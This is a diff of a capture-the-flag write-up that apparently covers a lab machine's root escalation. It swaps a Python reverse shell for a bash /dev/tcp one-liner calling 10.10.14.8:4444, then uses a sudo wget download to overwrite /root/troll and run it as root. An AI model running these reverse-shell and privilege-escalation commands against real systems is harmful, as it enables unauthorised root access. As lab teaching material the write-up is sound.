@@ -157,28 +157,22 @@ sudo wget --use-askpass=$TF 0
 + Pass to **sammy**'s session, and view the list of allowed commands the user can run as root.
 + Create a **rev_shell.py** file on your kali attack vm, and serve it with SimpleHTTPServer.
 ```
-#!/usr/bin/python
-import socket
-import subprocess
+#!/usr/bin/env python
 import os
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.14.8",4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"]);
+import sys
+os.system('bash -c "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"')
 ```
-
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7958d23f-6e5a-4568-8bfa-7992f15fed94)
 
 + Download request **rev_shell.py** with wget, using the `-O` option, which will allow us to specify a file to write the wget output to, and it will overwrite that file if it already exists.
 ```
 sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 ```
 
-+ Run it with sunny: `su sunny`
-+ Run: `sudo /root/troll`
++ Run it with sunny: `sudo /root/troll`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ee1abc40-ef93-490b-8150-376696d7e990)
+
++ Get the root shell.
 
 # References & Alternatives:
 + https://vvmlist.github.io/#poison
